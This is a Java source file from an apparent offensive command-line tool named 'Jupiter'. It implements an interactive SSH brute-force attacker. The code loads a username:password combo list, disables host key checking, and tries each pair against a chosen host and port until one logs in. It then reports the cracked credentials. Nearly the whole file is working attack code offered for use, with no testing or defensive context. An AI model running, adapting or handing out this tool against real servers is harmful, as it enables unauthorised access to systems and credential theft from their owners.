package org.thesecretintelligence.jupiter.input;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import org.thesecretintelligence.jupiter.utils.Title;
import org.thesecretintelligence.jupiter.utils.UnixColors;
import org.thesecretintelligence.jupiter.utils.User;

import java.io.File;
import java.net.Socket;
import java.net.SocketException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

import static org.thesecretintelligence.jupiter.Jupiter.clearScreen;

public class Input {

    public static String getInput;

    public static void get(Scanner scanner){
        System.out.print(UnixColors.ANSI_CYAN + "["+ User.getUser()+"@Jupiter] -$ ");
        getInput = scanner.nextLine();
        check(getInput);
    }

    public static void check(String input){
        String[] args = input.split(" ");
        if(input.equalsIgnoreCase("help")){
            System.out.println(" ");
            System.out.println(UnixColors.ANSI_BLUE + "  'SSH <ADDRESS:SSHPORT> <COMBOFILE> <TIMEOUT (Seconds)>' - Starts a SSH Bruteforce Session");
            System.out.println(" ");
            Scanner scanner = new Scanner(System.in);
            get(scanner);
        }else if(input.equalsIgnoreCase("clear")){
            clearScreen();
            Title.print();
            System.out.println(" ");
            Scanner scanner = new Scanner(System.in);
            get(scanner);
        }else if(input.equals("?")){
            System.out.println(" ");
            System.out.println(UnixColors.ANSI_BLUE + "  Jupiter Coded by The Secret Intelligence");
            System.out.println(UnixColors.ANSI_BLUE + "       thesecretintelligence.org");
            System.out.println(UnixColors.ANSI_BLUE + "    github.com/aaron-akhtar/Jupiter");
            System.out.println(" ");
            Scanner scanner = new Scanner(System.in);
            get(scanner);
        }else if(args[0].equalsIgnoreCase("ssh")){
            String[] connectionSettings = args[1].split(":");
            String address = connectionSettings[0];
            int port = 0;
            try{
                port = Integer.parseInt(connectionSettings[1]);
            }catch (NumberFormatException e){System.out.println(UnixColors.ANSI_RED + "Invalid Port!"); Scanner scanner = new Scanner(System.in); get(scanner);}

            File combos = new File("./" + args[2]);

            if(!combos.exists()){
                System.out.println(UnixColors.ANSI_RED + "Invalid Combo File!");
                Scanner scanner = new Scanner(System.in);
                get(scanner);
            }
            int timeout = 0;
            try {
                if (!args[3].isEmpty()) {
                    int x = Integer.parseInt(args[3]);
                    timeout = x * 1000;
                }
            }catch (NumberFormatException e){
                System.out.println(UnixColors.ANSI_RED + "Invalid Timeout!");
            }

            Socket socket;
            try{
                socket = new Socket(address, port);
                System.out.println(UnixColors.ANSI_GREEN + "A valid connection has been established, proceeding...");
            }catch (Exception e){
                System.out.println(UnixColors.ANSI_RED + "A connection couldn't be established to " + args[1] + "!");
                Scanner scanner = new Scanner(System.in);
                get(scanner);
            }

            List<String> comboStorage = new ArrayList();

            try{
                comboStorage = Files.readAllLines(Paths.get("" + combos));
            }catch (Exception e){
                System.out.println(UnixColors.ANSI_RED + "A error occurred while attempting to read combo list!");
                Scanner scanner = new Scanner(System.in);
                get(scanner);
            }

            System.out.println(UnixColors.ANSI_RED + "[!] WARNING: You may see errors occur, those are normal, when Jupiter manages to find a match to the SSH the process will stop, it is more efficient to run this on a screen if you plan to brute using a large combo.");
            try{Thread.sleep(2500);}catch (Exception e){}
            for (String i: comboStorage) {

                String[] combo = i.split(":");

                try {
                    System.out.println(UnixColors.ANSI_YELLOW + "Attempting Bruteforce with Credentials - " + i + "!");
                    JSch jsch = new JSch();
                    Session session = jsch.getSession(combo[0], address, port);
                    session.setPassword(combo[1]);
                    java.util.Properties config = new java.util.Properties();
                    config.put("StrictHostKeyChecking", "no");
                    session.setConfig(config);
                    session.setTimeout(timeout);
                    session.connect();
                    System.out.println(UnixColors.ANSI_GREEN + "Successfully bruted username and password to " + address + " -> " + i + "!");
                    session.disconnect();
                    Scanner scanner = new Scanner(System.in);
                    get(scanner);
                    break;
                } catch (JSchException e) {
                    System.out.println(UnixColors.ANSI_RED + "Failed Login with " + i + "!");
                }

            }
        }

    }

}
